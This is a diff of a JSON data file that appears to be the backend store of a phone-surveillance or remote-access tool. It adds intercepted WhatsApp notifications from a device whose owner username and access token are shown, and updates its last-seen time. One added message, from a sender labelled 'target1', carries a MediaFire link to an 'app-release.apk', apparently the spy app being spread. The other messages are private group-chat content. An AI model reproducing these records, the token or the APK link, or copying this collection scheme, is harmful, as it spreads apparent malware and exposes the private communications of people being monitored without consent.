@@ -22,6 +22,22 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "target1",
+        "content": "https://www.mediafire.com/file/rf40t2gsg2am208/app-release.apk/file",
+        "time": "30/04 06:54",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777502596965
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2670 pesan dari 17 chat",
+        "time": "30/04 06:54",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777502591854
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡ (455 pesan): ~ 𝖃i",
         "content": "💟 Stiker",
         "time": "30/04 06:54",
@@ -4003,22 +4019,6 @@
         "time": "30/04 06:28",
         "pkg": "com.whatsapp",
         "receivedAt": 1777501061428
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB || ISIAN  LYEZ STORE X ALL OWN (17 pesan): ~ Fine",
-        "content": "11 8 ppng no makro no mobi hp only",
-        "time": "30/04 06:28",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777501061137
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝙅𝙊𝙈𝙊𝙆𝙀𝙍𝙎 𝘼𝙍𝙀𝘼 𝙋𝙀𝙉𝙂𝙃𝙔𝙏𝘼𝙈𝘼𝙉⚔️👑 (193 pesan): ~ bmt112",
-        "content": "Menunggu pesan ini. Ini mungkin membutuhkan waktu beberapa saat.",
-        "time": "30/04 06:28",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777501060930
       }
     ],
     "galleryPhotos": [],
@@ -18141,7 +18141,7 @@
     "deviceName": "HP-ZAL7SEX-67C3",
     "ownerUsername": "Zal7Sex",
     "token": "228585cf435485e2101335e5900a661b",
-    "lastSeen": 1777502591457,
+    "lastSeen": 1777502594136,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-29T16:01:38.130Z",
